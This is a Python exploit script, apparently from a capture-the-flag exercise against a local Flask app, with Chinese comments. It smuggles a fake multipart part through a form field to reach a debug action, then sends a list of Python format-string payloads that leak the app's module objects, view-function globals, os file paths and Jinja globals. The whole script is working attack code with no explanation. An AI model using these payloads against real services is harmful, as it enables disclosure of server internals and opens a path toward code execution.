import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=5.0)
    return r.text.strip()

# 深入探索 - 查找可能包含文件路径信息的地方
payloads = [
    # 检查 flask 模块信息
    ('{0.__class__.__module__}', 'class module'),
    ('{0.__class__.__mro__}', 'class mro'),
    
    # httpx 模块 - 可能有缓存
    ('{0.view_functions[action].__globals__[httpx]}', 'httpx module'),
    
    # 检查 io 模块
    ('{0.view_functions[action].__globals__[BytesIO]}', 'BytesIO'),
    
    # 检查 json 模块
    ('{0.view_functions[action].__globals__[json]}', 'json module'),
    
    # os 模块的属性
    ('{0.view_functions[action].__globals__[os].__file__}', 'os.__file__'),
    
    # 检查 app 的 blueprints
    ('{0.blueprints}', 'blueprints'),
    
    # 检查 extensions
    ('{0.extensions}', 'extensions'),
    
    # 检查 url_build_error_handlers
    ('{0.url_build_error_handlers}', 'url_build_error_handlers'),
    
    # 检查 shell_context_processors
    ('{0.shell_context_processors}', 'shell_context_processors'),
    
    # 检查 teardown_appcontext_funcs
    ('{0.teardown_appcontext_funcs}', 'teardown_appcontext_funcs'),
    
    # 查找 inspect
    ('{0.jinja_env.globals[lipsum].__globals__}', 'lipsum globals (truncated)'),
]

for p, desc in payloads:
    try:
        result = format_string_leak(p)
        result = result[:2000] if len(result) > 2000 else result
        print(f"[{desc}]: {result}\n")
    except Exception as e:
        print(f"[{desc}]: Error - {e}\n")
